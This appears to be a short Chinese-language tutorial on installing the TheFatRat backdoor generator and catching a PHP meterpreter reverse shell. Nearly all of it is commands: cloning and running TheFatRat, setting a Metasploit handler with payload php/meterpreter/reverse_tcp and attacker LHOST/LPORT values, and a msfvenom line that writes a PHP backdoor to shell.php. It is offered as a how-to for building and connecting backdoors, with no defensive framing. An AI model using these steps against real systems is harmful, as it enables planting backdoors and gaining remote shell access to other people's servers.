## **下载安装指南**

  

> git clone https://github.com/Screetsec/TheFatRat.git     \\\\下载开源工具  
> cd Fatrat                                                \\\\进入工具目录  
> chmod +x fatrat                                          \\\\给程序给予权限  
> ./fatrat                                                 \\\\开始运行程序  

  

根据选项输入相应数字  
安装要求：

  

> linux操作系统，推荐Kali Linux 2或Kali 2016.1 rolling / Cyborg / Parrot / Dracos / BackTrack / Backbox等

> metasploit框架

启动 metaspoit 设置反弹 shell 的 ip 和端口：

> msf exploit(handler) > set payload php/meterpreter/reverse\_tcp      （设置payload 连接攻击者电脑类型）  
> payload => php/meterpreter/reverse\_tcp  
> msf exploit(handler) > set LHOST 192.168.1.104                            （设置）攻击者ip （和之前fatrat一样）  
> LHOST => 192.168.1.104                     
> msf exploit(handler) > set LPORT 4444                         （设置）攻击者需反弹的i端口（和之前fatrat一样）LPORT => 4444  
> msf exploit(handler) > exploit                        （执行监听）

同样，可以手动使用 msf 的 msfvenom 生成 php 后门（由于msf版本更新，移除metasploit-framework版本中的msfencoder和msfpayload，并使用msfvenom取代）

  

> msfvenom -p php/meterpreter\_reverse\_tcp LHOST=192.168.1.101 LPORT=4444 -f raw >shell.php  

  

msfvenom 具体使可参考： http://www.freebuf.com/sectool/72135.html 。
